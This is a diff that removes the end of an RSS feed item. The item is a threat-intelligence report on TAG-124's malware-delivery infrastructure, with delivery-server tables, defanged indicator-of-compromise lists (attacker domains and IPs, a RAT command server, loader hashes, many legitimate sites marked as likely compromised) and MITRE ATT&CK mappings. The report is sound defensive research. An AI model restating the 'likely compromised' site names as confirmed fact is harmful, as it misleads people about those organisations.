-            <div>45[.]61[.]136[.]196</div>
-            <div>2024-11-20</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>pweobmxdlboi[.]com</div>
-            <div>64[.]7[.]198[.]66</div>
-            <div>2024-08-27</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>boneyn[.]com</div>
-            <div>64[.]94[.]85[.]98</div>
-            <div>2024-12-22</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>satpr[.]com</div>
-            <div>64[.]94[.]85[.]98</div>
-            <div>2024-12-22</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>coeshor[.]com</div>
-            <div>64[.]94[.]85[.]248</div>
-            <div>2024-12-06</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>mtclibraries[.]com</div>
-            <div>64[.]94[.]85[.]248</div>
-            <div>2024-12-11</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>sdrce[.]com</div>
-            <div>64[.]95[.]11[.]65</div>
-            <div>2024-12-13</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>theinb[.]com</div>
-            <div>64[.]95[.]11[.]65</div>
-            <div>2024-12-13</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>elizgallery[.]com</div>
-            <div>64[.]95[.]11[.]184</div>
-            <div>2024-11-20</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>enethost[.]com</div>
-            <div>64[.]95[.]12[.]38</div>
-            <div>2024-12-26</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>dhusch[.]com</div>
-            <div>64[.]95[.]12[.]38</div>
-            <div>2024-12-24</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>fastard[.]com</div>
-            <div>64[.]95[.]12[.]38</div>
-            <div>2024-12-25</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>franklinida[.]com</div>
-            <div>64[.]95[.]12[.]98</div>
-            <div>2024-10-18</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>nastictac[.]com</div>
-            <div>64[.]190[.]113[.]41</div>
-            <div>2024-11-25</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>dncoding[.]com</div>
-            <div>64[.]190[.]113[.]41</div>
-            <div>2024-11-26</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>djnito[.]com</div>
-            <div>64[.]190[.]113[.]111</div>
-            <div>2024-12-11</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>opgears[.]com</div>
-            <div>64[.]190[.]113[.]111</div>
-            <div>2024-12-11</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>tickerwell[.]com</div>
-            <div>162[.]33[.]177[.]36</div>
-            <div>2024-11-19</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>selmanc[.]com</div>
-            <div>162[.]33[.]177[.]82</div>
-            <div>2024-12-16</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>tibetin[.]com</div>
-            <div>162[.]33[.]177[.]82</div>
-            <div>2024-12-16</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>mercro[.]com</div>
-            <div>162[.]33[.]178[.]59</div>
-            <div>2024-10-31</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>esaleerugs[.]com</div>
-            <div>162[.]33[.]178[.]63</div>
-            <div>2024-11-22</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>tayakay[.]com</div>
-            <div>162[.]33[.]178[.]75</div>
-            <div>2024-11-15</div>
-            <div>2024-11-15</div>
-          </div>
-          <div>
-            <div>ilsotto[.]com</div>
-            <div>162[.]33[.]178[.]113</div>
-            <div>2024-11-23</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>chewels[.]com</div>
-            <div>193[.]149[.]176[.]179</div>
-            <div>2024-12-05</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>sokrpro[.]com</div>
-            <div>193[.]149[.]176[.]223</div>
-            <div>2024-12-20</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>hdtele[.]com</div>
-            <div>193[.]149[.]176[.]223</div>
-            <div>2024-12-20</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>chhimi[.]com</div>
-            <div>193[.]149[.]176[.]248</div>
-            <div>2024-08-15</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>dechromo[.]com</div>
-            <div>216[.]245[.]184[.]179</div>
-            <div>2024-12-09</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>enerjjoy[.]com</div>
-            <div>216[.]245[.]184[.]179</div>
-            <div>2024-12-09</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>dsassoc[.]com</div>
-            <div>216[.]245[.]184[.]179</div>
-            <div>2024-12-18</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>gwcomics[.]com</div>
-            <div>216[.]245[.]184[.]210</div>
-            <div>2024-12-19</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>genhil[.]com</div>
-            <div>216[.]245[.]184[.]225</div>
-            <div>2024-11-18</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>vicrin[.]com</div>
-            <div>216[.]245[.]184[.]225</div>
-            <div>2024-11-05</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>eliztalks[.]com</div>
-            <div>216[.]245[.]184[.]225</div>
-            <div>2024-11-16</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>rshank[.]com</div>
-            <div>216[.]245[.]184[.]225</div>
-            <div>2024-11-13</div>
-            <div>2025-01-06</div>
-          </div>
-        </div>
-        <p><strong><em>Table 4</em></strong><em>: Likely threat actor-controlled TAG-124 delivery servers (Source: Recorded Future)</em></p>
-        <p>Most of the domains began resolving in November 2024, suggesting that TAG-124 gained momentum during this period, with the majority of the domains still active at the time of analysis. Of note, two domains hosted on <em>45[.]61[.]136[.]67</em>, namely <em>piedsmontlaw[.]com</em> and <em>pemalite[.]com</em>, were already resolving to this IP address in 2022, indicating that the server may have already been under the control of the threat actor during that time.</p>
-        <h5>Suspected Higher-Tier Infrastructure</h5>
-        <p>The majority of the suspected threat actor-controlled TAG-124 delivery servers, as listed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.78m3kdx91knq">TAG-124 Delivery Servers</a> section, have been seen communicating with a server over TCP port 443 (see <strong>Figure 1</strong>). The configurations of this server are similar to those of the delivery servers and host a domain that returns only a generic HTML page when accessed. At the time of analysis, Insikt Group could not determine the exact purpose of this server but suspects it plays a central role in the operation. One possibility is that it contains the core logic of the TDS.</p>
-        <p>Additionally, Insikt Group identified a suspected management server linked to TAG-124. This server has been observed communicating with the delivery servers via TCP ports 80 and 443. It has also interacted with another panel linked to TAG-124, referred to as the "Ads Panel", whose purpose includes serving the latest delivery server through a specified endpoint, among others (see <strong>Figure 1</strong>).</p>
-        <p>
-          <img loading="lazy" alt="cover" src="https://www.recordedfuture.com/media_121ba3c031a94fb80e45c6bb489b06f1ec5600b84.png?width=750&amp;format=png&amp;optimize=medium" width="580" height="750" />
-        </p>
-        <p>TAG-124’s Multi-Layered TDS Infrastructure and Extensive User Base</p>
-        <p>Read the Complete Analysis</p>
-        <p><a href="https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-2025-0130.pdf">Download report</a></p>
-        <h2>Appendix A — Indicators of Compromise</h2>
-        <div>
-          <div>
-            <div><strong>Likely Compromised WordPress Domains Used by TAG-124:</strong><br />1stproducts[.]com<br />3hti[.]com<br />academictutoringcenters[.]com<br />adpages[.]com<br />adsbicloud[.]com<br />advanceair[.]net<br />airbluefootgear[.]com<br />airinnovations[.]com<br />allaces[.]com[.]au<br />alumni[.]clemson[.]edu<br />ambir[.]com<br />americanreloading[.]com<br />antiagewellness[.]com<br />architectureandgovernance[.]com<br />astromachineworks[.]com<br />athsvic[.]org[.]au<br />baseball[.]razzball[.]com<br />bastillefestival[.]com[.]au<br />bigfoot99[.]com<br />blacksportsonline[.]com<br />blog[.]contentstudio[.]io<br />bluefrogplumbing[.]com<br />canadamotoguide[.]com<br />canadanickel[.]com<br />capecinema[.]org<br />careers[.]bms[.]com<br />careers[.]fortive[.]com<br />castellodelpoggio[.]com<br />catholiccharities[.]org<br />chamonixskipasses[.]com<br />changemh[.]org<br />chicklitplus[.]com<br />clmfireproofing[.]com<br />comingoutcovenant[.]com<br />complete-physio[.]co[.]uk<br />complete-pilates[.]co[.]uk<br />conical-fermenter[.]com<br />cssp[.]org<br />deathtotheworld[.]com<br />deerfield[.]com<br />denhamlawoffice[.]com<br />dev[.]azliver[.]com<br />development[.]3hti[.]com<br />digimind[.]nl<br />dotnetreport[.]com<br />drcolbert[.]com<br />dzyne[.]com<br />earthboundfarm[.]com<br />eivcapital[.]com<br />elitetournaments[.]com<br />ergos[.]com<br />esfna[.]org<br />espumadesign[.]com<br />exceptionalindividuals[.]com<br />experiencebrightwater[.]ca<br />firstpresbyterianpaulding[.]com<br />fractalerts[.]com<br />fusionstone[.]ca<br />global-engage[.]com<br />gobrightwing[.]com<br />gov2x[.]com<br />hksusa[.]com<br />hmgcreative[.]com<br />hmh[.]org<br />hoodcontainer[.]com<br />hospitalnews[.]com<br />housingforhouston[.]com<br />houstonmaritime[.]org<br />hrsoft[.]com<br />hungryman[.]com<br />icmcontrols[.]com<br />ijmtolldiv[.]com<br />innsbrook[.]com<br />jewelryexchange[.]com<br />jodymassagetherapyclinic[.]com<br />joelbieber[.]com<br />knewhealth[.]com<br />lamaisonquilting[.]com<br />legacy[.]orlandparkprayercenter[.]org<br />levyso[.]com<br />luxlifemiamiblog[.]com<br />magnoliagreen[.]com<br />magnotics[.]com<br />manawatunz[.]co[.]nz<br />mantonpushrods[.]com<br />michiganchronicle[.]com<br />michigantownships[.]org<br />monlamdesigns[.]com<br />montessoriwest[.]com<br />movinbed[.]com<br />my[.]networknuts[.]net<br />myrtlebeachgolf[.]com<br />ncma[.]org<br />oglethorpe[.]edu<br />oningroup[.]com<br />orlandparkprayercenter[.]org<br />outdoornativitystore[.]com<br />parksaverscom[.]kinsta[.]cloud<br />peoria[.]org<br />peridotdentalcare[.]ca<br />phfi[.]org<br />pikapp[.]org<br />powerlineblog[.]com<br />prek4sa[.]com<br />psafetysolutions[.]com<br />puntademita-rentals[.]com<br />resf[.]com<br />retaildatallc[.]com<br />rhodenroofing[.]com<br />rm-arquisign[.]com<br />rvthereyet[.]com<br />schroederindustries[.]com<br />sec-group[.]co[.]uk<br />sixpoint[.]com<br />slotomoons[.]com<br />sollishealth[.]com<br />sparkcarwash[.]com<br />spectralogic[.]com<br />sramanamitra[.]com<br />stg-seatrail-staging[.]kinsta[.]cloud<br />stg-townandcountryplanningassoci-staging[.]kinsta[.]cloud<br />sustaincharlotte[.]org<br />teamtoc[.]com<br />terryrossplumbing[.]com<br />theawningcompanc[.]mrmarketing[.]us<br />theepicentre[.]com<br />theyard[.]com<br />tristatecr[.]com<br />true-blood[.]net<br />turtl[.]co<br />tustinhistory[.]com<br />tysonmutrux[.]com<br />uk[.]pattern[.]com<br />unsolved[.]com<br />vanillajoy[.]ykv[.]ijh[.]mybluehost[.]me<br />vectare[.]co[.]uk<br />villageladies[.]co[.]uk<br />walkerroofingandconstruction[.]com<br />wildwestguns[.]com<br />wildwoodpress[.]org<br />wlplastics[.]com<br />worldorphans[.]org<br />www[.]211cny[.]com<br />www[.]6connex[.]com<br />www[.]900biscaynebaymiamicondos[.]com<br />www[.]accentawnings[.]com<br />www[.]acvillage[.]net<br />www[.]airandheatspecialistsnj[.]com<br />www[.]als-mnd[.]org<br />www[.]americancraftbeer[.]com<br />www[.]anoretaresort[.]com<br />www[.]architectureandgovernance[.]com<br />www[.]atlantaparent[.]com<br />www[.]atlas-sp[.]com<br />www[.]atmosera[.]com<br />www[.]belvoirfarm[.]co[.]uk<br />www[.]betterengineering[.]com<br />www[.]bluefoxcasino[.]com<br />www[.]boatclubtrafalgar[.]com<br />www[.]bordgaisenergytheatre[.]ie<br />www[.]brandamos[.]com<br />www[.]cairnha[.]com<br />www[.]cdhcpa[.]com<br />www[.]cds[.]coop<br />www[.]cgimgolf[.]com<br />www[.]cheericca[.]org<br />www[.]conwire[.]com<br />www[.]cssp[.]org<br />www[.]dces[.]com<br />www[.]disabilityscot[.]org[.]uk<br />www[.]doctorkiltz[.]com<br />www[.]drivenbyboredom[.]com<br />www[.]ecowas[.]int<br />www[.]evercoat[.]com<br />www[.]facefoundrie[.]com<br />www[.]foxcorphousing[.]com<br />www[.]genderconfirmation[.]com<br />www[.]gofreight[.]com<br />www[.]gunnerroofing[.]com<br />www[.]hayeshvacllc[.]com<br />www[.]hksusa[.]com<br />www[.]hollingsworth-vose[.]com<br />www[.]hollywoodburbankairport[.]com<br />www[.]hopechc[.]org<br />www[.]icmcontrols[.]com<br />www[.]inboundlogistics[.]com<br />www[.]infra-metals[.]com<br />www[.]jasperpim[.]com<br />www[.]koimoi[.]com<br />www[.]louisvillemechanical[.]com<br />www[.]lsbn[.]state[.]la[.]us<br />www[.]mallorcantonic[.]com<br />www[.]marketlist[.]com<br />www[.]mocanyc[.]org<br />www[.]motherwellfc[.]co[.]uk<br />www[.]murphyoilcorp[.]com<br />www[.]myrtlebeachgolfpackages[.]co<br />www[.]napcis[.]org<br />www[.]nelsongonzalez[.]com<br />www[.]netzwerkreklame[.]de<br />www[.]onthegreenmagazine[.]com<br />www[.]orthodontie-laurentides[.]com<br />www[.]pamelasandalldesign[.]com<br />www[.]parajohn[.]com<br />www[.]parksavers[.]com<br />www[.]parmacalcio1913[.]com<br />www[.]patio-supply[.]com<br />www[.]pcbc[.]gov[.]pl<br />www[.]perfectduluthday[.]com<br />www[.]powerlineblog[.]com<br />www[.]progarm[.]com<br />www[.]rafilawfirm[.]com<br />www[.]reddiseals[.]com<br />www[.]riaa[.]com<br />www[.]robertomalca[.]com<br />www[.]sevenacres[.]org<br />www[.]sigmathermal[.]com<br />www[.]sisdisinfestazioni[.]it<br />www[.]spectralink[.]com<br />www[.]sramanamitra[.]com<br />www[.]sunkissedindecember[.]com<br />www[.]sweetstreet[.]com<br />www[.]system-scale[.]com<br />www[.]tcpa[.]org[.]uk<br />www[.]thatcompany[.]com<br />www[.]the-kaisers[.]de<br />www[.]thecreativemom[.]com<br />www[.]thedesignsheppard[.]com<br />www[.]therialtoreport[.]com<br />www[.]thetrafalgargroup[.]co[.]uk<br />www[.]thetruthaboutguns[.]com<br />www[.]totem[.]tech<br />www[.]ultrasound-guided-injections[.]co[.]uk<br />www[.]urbis-realestate[.]com<br />www[.]vending[.]com<br />www[.]venetiannj[.]com<br />www[.]visitarundel[.]co[.]uk<br />www[.]wefinanceanycar[.]com<br />www[.]wilsonsd[.]org<br /><br />www[.]wilymanager[.]com<br />www[.]wvwc[.]edu<br />zerocap[.]com<br /><br /><br /><strong>Likely Compromised Websites Showing Fake Google Chrome Update Pages:</strong><br />avayehazar[.]ir<br />cvqrcode[.]lpmglobalrelations[.]com<br />elamoto[.]com<br />evolverangesolutions[.]com<br />gmdva[.]org<br />incalzireivar[.]ro<br />mgssoft[.]com<br />mktgads[.]com<br />ns1[.]webasatir[.]ir<br />selectmotors[.]net<br />sollishealth[.]com<br />update-chronne[.]com<br />www[.]de[.]digitaalkantoor[.]online<br />www[.]ecowas[.]int<br />www[.]lovebscott[.]com<br />www[.]reloadinternet[.]com<br /><br /><br /><strong>TAG-124 Domains:</strong><br />ambiwa[.]com<br />boneyn[.]com<br />calbbs[.]com<br />chewels[.]com<br />chhimi[.]com<br />coeshor[.]com<br />dechromo[.]com<br />dhusch[.]com<br />discoves[.]com<br />djnito[.]com<br />dncoding[.]com<br />dsassoc[.]com<br />ecrut[.]com<br />elizgallery[.]com<br />eliztalks[.]com<br />enerjjoy[.]com<br />enethost[.]com<br />esaleerugs[.]com<br />fastard[.]com<br />franklinida[.]com<br />gcafin[.]com<br />genhil[.]com<br />gwcomics[.]com<br />habfan[.]com<br />hdtele[.]com<br />howmanychairs[.]com<br />ilsotto[.]com<br />iognews[.]com<br />mercro[.]com<br />mirugby[.]com<br />mtclibraries[.]com<br />nastictac[.]com<br />nyciot[.]com<br />opgears[.]com<br />pemalite[.]com<br />piedsmontlaw[.]com<br />pursyst[.]com<br />pushcg[.]com<br />pweobmxdlboi[.]com<br />rshank[.]com<br />safigdata[.]com<br />satpr[.]com<br />sdrce[.]com<br />selmanc[.]com<br />sokrpro[.]com<br />tayakay[.]com<br />theinb[.]com<br />tibetin[.]com<br />tickerwell[.]com<br />usbkits[.]com<br />vicrin[.]com<br />xaides[.]com<br /><br /><br /><strong>TAG-124 IP Addresses:</strong><br />45[.]61[.]136[.]9<br />45[.]61[.]136[.]40<br />45[.]61[.]136[.]41<br />45[.]61[.]136[.]67<br />45[.]61[.]136[.]89<br />45[.]61[.]136[.]132<br />45[.]61[.]136[.]196<br />64[.]7[.]198[.]66<br />64[.]94[.]85[.]98<br />64[.]94[.]85[.]248<br />64[.]95[.]11[.]65<br />64[.]95[.]11[.]184<br />64[.]95[.]12[.]38<br />64[.]95[.]12[.]98<br />64[.]190[.]113[.]41<br />64[.]190[.]113[.]111<br />162[.]33[.]177[.]36<br />162[.]33[.]177[.]82<br />162[.]33[.]178[.]59<br />162[.]33[.]178[.]63<br />162[.]33[.]178[.]75<br />162[.]33[.]178[.]113<br />193[.]149[.]176[.]179<br />193[.]149[.]176[.]223<br />193[.]149[.]176[.]248<br />216[.]245[.]184[.]179<br />216[.]245[.]184[.]210<br />216[.]245[.]184[.]225<br /><br /><br /><strong>Additional Domains Observed in TAG-124 Activity:</strong><br />winworld[.]es<br />true-blood[.]net<br /><br /><br /><strong>Matomo Instance:</strong><br />dating2go[.]store<br /><br /><br /><strong>Domains Likely Linked to apple-online[.]shop:</strong><br />micronsoftwares[.]com<br />mysamsung7[.]shop<br />nvidias[.]shop<br />expressbuycomputers[.]shop<br />amdradeon[.]shop<br />mobileyas[.]shop<br />cryptotap[.]site<br /><br /><br /><strong>REMCOS RAT C2 IP Address:</strong><br />146.70.41[.]191<br /><br /><br /><strong>Domains Likely Linked to TA582 and MintsLoader Cluster:</strong><br />527newagain[.]top<br />abhbdiiaehdejgh[.]top<br />adednihknaalilg[.]top<br />anjmhjidinfmlci[.]top<br />azure-getrequest[.]icu<br />azurearc-cdn[.]top<br />azuregetrequest[.]icu<br />bkkeiekjfcdaaen[.]top<br />cignjjgmdnbchhc[.]top<br />ckebfjgimhmjgmb[.]top<br />cljhkcjfimibhci[.]top<br />cmcebigeiajbfcb[.]top<br />cmcuauec[.]top<br />cryptoslate[.]cc<br />eebchjechginddk[.]top<br />ehnediemcaffbij[.]top<br />ejlhaidjmhcmami[.]top<br />faybzuy3byz2v[.]top<br />fpziviec[.]top<br />futnbuzj3nh[.]top<br />gbkffjcglabkmne[.]top<br />gdihcicdghmcldd[.]top<br />get-azurecommand[.]icu<br />get-iwrreq[.]top<br />getazurecommand[.]icu<br />gnmdjjckbgddaie[.]top<br />gubyzywey6b[.]top<br />iadkainhkafngnk[.]top<br />ikhgijabfnkajem[.]top<br />ikjfjkkagafbdke[.]top<br />imfiejalbhhgijl[.]top<br />kffgkjmjangegkg[.]top<br />khcjgjmfjgdleag[.]top<br />kjalcimbfaaddff[.]top<br />mcajijknegnbbga[.]top<br />melmejkjaakiakn[.]top<br />mgjabikgjhhambm[.]top<br />pretoria24[.]top<br />rifiziec[.]top<br />riuzvi4tc[.]top<br />robnzuwubz[.]top<br />saighbuzu32uvv[.]top<br /><br /><br /><strong>PyInstaller Hashes:</strong><br />7683d38c024d0f203b374a87b7d43cc38590d63adb8e5f24dff7526f5955b15a<br />950f1f8d94010b636cb98be774970116d98908cd4c45fbb773e533560a4beea7<br />7f8e9d7c986cc45a78c0ad2f11f28d61a4b2dc948c62b10747991cb33ce0e241<br /><br /><br /><strong>CleanUpLoader Loader Hashes:</strong><br />183c57d9af82964bfbb06fbb0690140d3f367d46d870e290e2583659609b19f2<br />22dc96b3b8ee42096c66ab08e255adce45e5e09a284cbe40d64e83e812d1b910<br />9d508074a830473bf1dee096b02a25310fa7929510b880a5875d3c316617dd50<br />28c49af7c95ab41989409d2c7f98e8f8053e5ca5f7a02b2a11ad4374085ec6ff<br />2da62d1841a6763f279c481e420047a108da21cd5e16eae31661e6fd5d1b25d7<br />342b889d1d8c81b1ba27fe84dec2ca375ed04889a876850c48d2b3579fbac206<br />42c1550b035353ae529e98304f89bf6065647833e582d08f0228185b493d0022<br />42d7135378ed8484a6a86a322ea427765f2e4ad37ee6449691b39314b5925a27<br />430fd4d18d22d0704db1c4a1037d8e1664bfc003c244650cb7538dbe7c3be63e<br />43f4ca1c7474c0476a42d937dc4af01c8ccfc20331baa0465ac0f3408f52b2e2<br />46aac6bf94551c259b4963157e75073cb211310e2afab7a1c0eded8a175d0a28<br />4fa213970fdef39d2506a1bd4f05a7ceee191d916b44b574022a768356951a23<br />57e9e1e3ebd78d4878d7bb69e9a2b0d0673245a87eb56cf861c7c548c4e7b457<br />6464cdbfddd98f3bf6301f2bf525ad3642fb18b434310ec731de08c79e933b3e<br />67b5b54c85e7590d81a404d6c7ea7dd90d4bc773785c83b85bcce82cead60c37<br />700f1afeb67c105760a9086b0345cb477737ab62616fd83add3f7adf9016c5e5<br />77dc705cecbc29089c8e9eea3335ba83de57a17ed99b0286b3d9301953a84eca<br />7b8d4b1ab46f9ad4ef2fd97d526e936186503ecde745f5a9ab9f88397678bc96<br />7ea83cca00623a8fdb6c2d6268fa0d5c4e50dbb67ab190d188b8033d884e4b75<br />8d911ef72bdb4ec5b99b7548c0c89ffc8639068834a5e2b684c9d78504550927<br />92d2488e401d24a4bfc1598d813bc53af5c225769efedf0c7e5e4083623f4486<br />941fa9119eb1413fdd4f05333e285c49935280cc85f167fb31627012ef71a6b3<br />95b9c9bf8fa3874ad9e6204f408ce162cd4ae7a8253e69c3c493188cb9d1f4da<br />97105ed172e5202bc219d99980ebbd01c3dfd7cd5f5ac29ca96c5a09caa8af67<br />9d508074a830473bf1dee096b02a25310fa7929510b880a5875d3c316617dd50<br /><br /><br /><strong>Suspected MintsLoader:</strong><br />d738eef8756a03a516b02bbab0f1b06ea240efc151f00c05ec962d392cfddb93<br />77bd80e2a7c56eb37a33c2a0518a27deb709068fdc66bd1e00b5d958a25c7ad8<br />ccdf82b45b2ee9173c27981c51958e44dee43131edfbce983b6a5c146479ac33</div>
-          </div>
-        </div>
-        <h2>Appendix B — Mitre ATT&amp;CK Techniques</h2>
-        <div>
-          <div>
-            <div><strong>Tactic: Technique</strong></div>
-            <div><strong>ATT&amp;CK Code</strong></div>
-          </div>
-          <div>
-            <div><strong>Resource Development:</strong> Acquire Infrastructure: Domains</div>
-            <div>T1583.001</div>
-          </div>
-          <div>
-            <div><strong>Resource Development:</strong> Acquire Infrastructure: Virtual Private Server</div>
-            <div>T1583.003</div>
-          </div>
-          <div>
-            <div><strong>Resource Development:</strong> Acquire Infrastructure: Server</div>
-            <div>T1583.004</div>
-          </div>
-          <div>
-            <div><strong>Resource Development:</strong> Compromise Infrastructure: Domains</div>
-            <div>T1584.001</div>
-          </div>
-          <div>
-            <div><strong>Resource Development:</strong> Develop Capabilities: Malware</div>
-            <div>T1587.001</div>
-          </div>
-          <div>
-            <div><strong>Initial Access:</strong> Stage Capabilities: Drive-by Target</div>
-            <div>T1608.004</div>
-          </div>
-          <div>
-            <div><strong>Defense Evasion:</strong> Impersonation</div>
-            <div>T1656</div>
-          </div>
-        </div>
-      ]]></content:encoded>
-            <category>Research (Insikt)</category>
-            <enclosure length="0" type="image/jpg" url="https://www.recordedfuture.com/research/media_12c6050522390ce5a15dc6a6284d008aa26ba923e.png?width=1200&amp;format=pjpg&amp;optimize=medium"/>
         </item>
     </channel>
 </rss>
